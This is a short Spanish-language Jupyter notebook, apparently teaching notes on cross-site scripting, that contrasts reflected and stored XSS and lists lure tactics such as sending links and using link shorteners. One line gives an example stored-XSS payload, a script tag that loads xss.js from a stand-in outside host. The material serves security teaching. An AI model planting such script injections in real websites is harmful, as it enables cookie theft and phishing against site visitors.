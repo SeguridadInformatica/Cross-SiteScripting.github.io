{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Non Persistent Scripts\n",
    "\n",
    "* El ataque corre de lado del cliente y solo afecta al que lo ejecuta\n",
    "* Se debe a que no se protegen los inputs de HTML\n",
    "* Es el mas comun de su clase\n",
    "* Ejemplos de codigo malicioso : Redireccion a pishing, robar cookies, hacer que el usuario haga alguna accion\n",
    "\n",
    "\n",
    "## Estrategias de ataque\n",
    "\n",
    "* Hacer que la victima haga click en un link \n",
    "* Usar acortadores de links \n",
    "\n",
    "\n",
    "# Persistent Scripts\n",
    "\n",
    "* Son scripts que estan en la pagina web permanentemente, tienen el codigo malicioso almacenado en la base de datos de la web.\n",
    "* El codigo malicioso se puede almacenar en la web y ejecutarlo con la etiqueta script , por ejemplo : < script src = \"http://hehehehe.com/xss.js\"> < /script>\n",
    "* Usualmente se da en las interacciones con la base de datos\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
